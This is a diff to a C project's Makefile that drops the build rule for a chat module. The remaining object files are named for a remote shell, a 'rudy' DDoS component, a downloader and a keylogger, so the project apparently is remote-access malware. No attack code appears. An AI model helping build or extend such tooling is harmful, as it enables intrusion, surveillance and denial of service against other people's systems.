@@ -41,7 +41,6 @@ OBJECTFILES= \
 	${OBJECTDIR}/src/callbacks_main.o \
 	${OBJECTDIR}/src/callbacks_remote_shell.o \
 	${OBJECTDIR}/src/callbacks_rudy_arme_ddos.o \
-	${OBJECTDIR}/src/callbacks_tchat.o \
 	${OBJECTDIR}/src/clt_main.o \
 	${OBJECTDIR}/src/downloader.o \
 	${OBJECTDIR}/src/keylogger.o \
@@ -102,11 +101,6 @@ ${OBJECTDIR}/src/callbacks_rudy_arme_ddos.o: src/callbacks_rudy_arme_ddos.c
 	${MKDIR} -p ${OBJECTDIR}/src
 	${RM} "$@.d"
 	$(COMPILE.c) -O2 -I/usr/include `pkg-config --cflags --cflags gstreamer-1.0` `pkg-config --cflags gtk+-2.0`   -MMD -MP -MF "$@.d" -o ${OBJECTDIR}/src/callbacks_rudy_arme_ddos.o src/callbacks_rudy_arme_ddos.c
-
-${OBJECTDIR}/src/callbacks_tchat.o: src/callbacks_tchat.c
-	${MKDIR} -p ${OBJECTDIR}/src
-	${RM} "$@.d"
-	$(COMPILE.c) -O2 -I/usr/include `pkg-config --cflags --cflags gstreamer-1.0` `pkg-config --cflags gtk+-2.0`   -MMD -MP -MF "$@.d" -o ${OBJECTDIR}/src/callbacks_tchat.o src/callbacks_tchat.c
 
 ${OBJECTDIR}/src/clt_main.o: src/clt_main.c
 	${MKDIR} -p ${OBJECTDIR}/src
